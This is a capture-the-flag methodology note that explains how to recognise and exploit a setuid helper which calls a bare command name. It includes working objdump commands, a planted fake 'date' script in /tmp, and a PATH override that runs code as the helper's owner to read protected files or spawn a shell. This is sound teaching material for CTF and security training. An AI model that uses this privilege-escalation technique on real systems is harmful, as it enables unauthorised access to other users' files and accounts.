---
id: setuid-path-hijack-relative-command
category: PWN
tags: [setuid, path-hijack, gtfobins, relative-path, system, execlp, environment, privilege-escalation, setreuid, euid, local-privesc, privesc]
tools: []
manuals: []
title: "Setuid binary runs a bare command name → PATH hijack to its privilege"
difficulty: medium
created: 2026-11-16
updated: 2026-11-16
related: [sudo-nopasswd-writable-input-exec, sudo-helper-forgeable-mac-gate, boot2root-methodology-checklist]
---

## How to recognize this pattern

- A **setuid** helper (`-rws... owner group`) that, when reversed/straced, calls `system("date ...")`
  / `execlp("ls", ...)` with a **relative command name** (no absolute path), and often `setreuid(e,e)`
  / `setuid(geteuid())` *before* it so the spawned shell keeps the elevated privilege.
- You run as one uid but the flag (or next step) is owned by the setuid binary's owner. The SDK/handout
  may even ship the real helper so you can confirm the bug offline (`objdump -d`, `strings`).

## Method

### 1. Confirm the relative-command call
```bash
objdump -d ./helper | grep -A2 'call.*system'      # arg is "date ..." not "/bin/date ..."
objdump -T ./helper | grep UND                     # geteuid/setreuid/system -> the GTFOBins shape
```

### 2. Plant your own command earlier in PATH
```bash
mkdir -p /tmp/ph && printf '#!/bin/sh\nid\ncat /path/to/flag* 2>/dev/null\n' > /tmp/ph/date
chmod +x /tmp/ph/date
PATH=/tmp/ph:$PATH /usr/local/bin/helper           # helper's system() resolves OUR date first
```
Your script runs **as the helper's owner**. `id` should show that owner (not your uid).

### 3. Use the privilege to reach the flag
As the privileged user, read or `cp --chmod=0644` a file you otherwise can't (or spawn a shell). If the
flag is a file you still can't display locally, copy it world-readable, then read it back as yourself.

## Gotchas

- `setreuid(geteuid(), geteuid())` before `system()` is the tell: it sets `ruid == euid` so the forked
  `/bin/sh` keeps the privilege with no mismatch to drop — textbook GTFOBins.
- If `system()` uses an **absolute** path, PATH hijack fails — look instead for a writable library,
  `LD_PRELOAD` (dropped for setuid, usually), or a different relative-resource load.
- Escape pitfalls in the planted script: `\&\&` reaching `/bin/sh` is a syntax error — use `if/then/fi`.
- Export `DISPLAY`/`XAUTHORITY` in the script if the privileged stage must render to a GUI/stream.
- Only ever read **your own** target file; don't touch other teams'/users' flags.

## Cross-reference

- `sudo-nopasswd-writable-input-exec`, `sudo-helper-forgeable-mac-gate`: sibling local-privesc gates.
- `boot2root-methodology-checklist`: where setuid/PATH checks sit in the full enumeration.
